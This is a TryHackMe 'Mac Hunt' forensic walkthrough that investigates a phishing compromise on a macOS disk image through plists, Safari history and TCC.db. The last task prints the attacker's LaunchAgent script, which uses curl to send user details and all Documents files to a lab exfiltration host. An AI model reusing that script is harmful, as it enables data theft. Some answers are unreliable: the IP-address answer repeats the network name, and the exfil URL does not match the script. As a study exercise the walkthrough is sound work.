<h1 align="center">DFIR, Digital Forensics and Incident Response<br>macOS Forensics<br><img width="660px" src="https://github.com/user-attachments/assets/5e7f8c2d-53bf-43b7-81af-08b943f5b2b0"><br>Mac Hunt</h1>

<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/a2c9e9c5-8d86-4447-8d3b-0a395b457c20"><br>
June 29, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>419</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
Utilize your macOS investigation skills to reveal the mystery behind a compromise. Access it <a href="https://tryhackme.com/room/machunt"</a>here.<br>
<img width="1200px" src=""></p>

<h2> Task 1 . Job Phish</h2>


<h3 align="left"> Answer the question below</h3>

> 1.1. <em>What is the name of the most recently accessed folder by the user?</em><br><a id='1.1'></a>
>> <strong><code>Downloads</code></strong><br>
<p></p>


```bash
ubuntu@tryhackme:~$ ls
Desktop    Downloads     Music     Public     Videos     libplist  snap
Documents  Jack_Mac.img  Pictures  Templates  apfs-fuse  mac
ubuntu@tryhackme:~$ apfsutil Jack_Mac.img
...
Volume 4 EBEDFBF0-0AF7-4ED5-9375-9A941CD18F9B
---------------------------------------------
Role:               Data
Name:               Data (Case-insensitive)
Capacity Consumed:  2391252992 Bytes
FileVault:          No
Snapshots:
...
ubuntu@tryhackme:~$ sudo su
root@tryhackme:/home/ubuntu# apfs-fuse -v 4 Jack_Mac.img mac
root@tryhackme:/home/ubuntu# cd mac
root@tryhackme:/home/ubuntu/mac# ls
private-dir  root
...
root@tryhackme:/home/ubuntu/mac/root/Users/jake/Library/Preferences# plistutil -p com.apple.finder.plist
```

![image](https://github.com/user-attachments/assets/433bc341-5180-4392-9588-231a08be327c)

```bash
"FXRecentFolders": [
    {
      "file-bookmark": <626f6f6b 98020000 00000410 30000000 ... 04 00000000 000000>,
      "name": "Downloads"
    },
    {
      "file-bookmark": <626f6f6b 98020000 00000410 30000000 ... 04 00000000 000000>,
      "name": "Documents"
    },
    {
      "file-bookmark": <626f6f6b 6c030000 00000410 30000000 ... 04 00000000 000000>,
      "name": "GUEST TOOLS"
    }
  ],
```

<br>

> 1.2. <em>Which social platform did the attacker use to deliver the document?</em><br><a id='1.2'></a>
>> <strong><code>LinkedIN</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Users/jake/Library/Safari# cp History.db /home/ubuntu/sql
```

![image](https://github.com/user-attachments/assets/56de82ef-82de-4f08-b429-6f348b4fc428)

```bash
SELECT
  DATETIME(HISTORY_VISITS.VISIT_TIME+978307200,'UNIXEPOCH') AS "VISIT TIME",
  HISTORY_ITEMS.URL AS "URL",
  HISTORY_ITEMS.VISIT_COUNT AS "VISIT COUNT",
  HISTORY_VISITS.TITLE AS "TITLE",
  CASE HISTORY_VISITS.ORIGIN
   WHEN 1 THEN "ICLOUD SYNCED DEVICE"
   WHEN 0 THEN "VISITED FROM THIS DEVICE"
   ELSE HISTORY_VISITS.ORIGIN
  END "ICLOUD SYNC",
  HISTORY_VISITS.LOAD_SUCCESSFUL AS "LOAD SUCCESSFUL",
  HISTORY_VISITS.id AS "VISIT ID",
  HISTORY_VISITS.REDIRECT_SOURCE AS "REDIRECT SOURCE",
  HISTORY_VISITS.REDIRECT_DESTINATION AS "REDIRECT DESTINATION",
  HISTORY_VISITS.ID AS "HISTORY ITEM ID"
 FROM HISTORY_ITEMS
 LEFT OUTER JOIN HISTORY_VISITS ON HISTORY_ITEMS.ID == HISTORY_VISITS.HISTORY_ITEM
```

![image](https://github.com/user-attachments/assets/247e8036-0c5a-4869-bd8d-975a2fae796f)

<br>


> 1.3. <em>What link did the attacker craft for the victim to download the MeetMeLive application?</em><br><a id='1.3'></a>
>> <strong><code>http://files.techthm.careers.thm:8080/MeetMeLiveInstaller.pkg</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/ad99b52a-9b3e-4d04-9060-0d09991be10a)

![image](https://github.com/user-attachments/assets/7280a620-1f51-416e-9a16-cb36addc0ad1)

![image](https://github.com/user-attachments/assets/4a537a5d-2a28-4b44-8ec1-626b64712480)

![image](https://github.com/user-attachments/assets/0cf4d372-40c6-4a21-8aee-f7032646b290)


<br>

> 1.4. <em>Which network did Jake connect to after reading the instructions in the PDF?</em><br><a id='1.4'></a>
>> <strong><code>Jake M. iPhone</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Library/Preferences# plistutil -p com.apple.wifi.known-networks.plist
{
  "wifi.network.ssid.Jake M. iPhone": {
    "__OSSpecific__": {
      "ChannelHistory": [
        {
          "Channel": 6,
          "Timestamp": 2025-04-30 09:51:00 +0000
        }
      ],
      "CollocatedGroup": [],
      "RoamingProfileType": "None",
      "TemporarilyDisabled": 0
...
```

<br>

> 1.5. <em>What was the  IP address assigned to Jake’s system?</em><br><a id='1.5'></a>
>> <strong><code>Jake M. iPhone</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Library/Preferences# plistutil -p com.apple.wifi.known-networks.plist
{
  "wifi.network.ssid.Jake M. iPhone": {
    "__OSSpecific__": {
      "ChannelHistory": [
        {
          "Channel": 6,
          "Timestamp": 2025-04-30 09:51:00 +0000
        }
      ],
      "CollocatedGroup": [],
      "RoamingProfileType": "None",
      "TemporarilyDisabled": 0
...
```

<br>

> 1.6. <em>When did the application get installed into the system? (YYYY-MM-DD HH:MM:SS)</em><br><a id='1.6'></a>
>> <strong><code>2025-04-30 08:54:20</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Library/Receipts# ls
InstallHistory.plist  db
root@tryhackme:/home/ubuntu/mac/root/Library/Receipts# plistutil -p InstallHistory.plist
[
  {
    "date": 2025-04-11 12:38:30 +0000,
    "displayName": "macOS 15.3.2",
    "displayVersion": "15.3.2",
    "processName": "softwareupdated"
  },
...
  {
    "date": 2025-04-30 08:54:20 +0000,
    "displayName": "MeetMeLiveInstaller",
    "displayVersion": "",
    "packageIdentifiers": [
      "com.meetmelive.app"
    ],
    "processName": "Installer"
  }
]
```

<br>

> 1.7. <em>What is the human-friendly name for the permission the user explicitly granted for the application??</em><br><a id='1.7'></a>
>> <strong><code>Full Disk Access_</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Users/jake/Library/Application Support/com.apple.TCC# ls
TCC.db
root@tryhackme:/home/ubuntu/mac/root/Users/jake/Library/Application Support/com.apple.TCC# sqlitebrowser TCC.db
```

![image](https://github.com/user-attachments/assets/d591d90d-afbb-4ac9-868f-190cbd86cc28)

![image](https://github.com/user-attachments/assets/b4918222-b69e-4ab4-8953-b5a7f09ed250)

<br>

> 1.8. <em>Which feature of the OS did the attacker use to run their application at startup persistently?</em><br><a id='1.8'></a>
>> <strong><code>LaunchAgents</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Library/Application Support/com.apple.TCC# ls
AdhocSignatureCache  REG.db  TCC.db
root@tryhackme:/home/ubuntu/mac/root/Library/Application Support/com.apple.TCC# cp TCC.db /home/ubuntu/TCC.db
root@tryhackme:/home/ubuntu/mac/root/Library/Application Support/com.apple.TCC# 
```

> 1.9. <em>What was the URL to which the application was exfiltrating data?</em><br><a id='1.9'></a>
>> <strong><code>http://techthm.thm/exfils</code></strong><br>
<p></p>

```bash
root@tryhackme:/home/ubuntu/mac/root/Users/jake/Library/LaunchAgents# cat MeetMeLive.sh
#!/bin/bash

curl -s -X POST http://techthm.thm/exfil -d "user=$(whoami)&time=$(date)"
find ~/Documents -type f | while read file; do
    curl -s -X POST http://techthm.thm/exfil -F "file=@$file"
done
exit 0

```




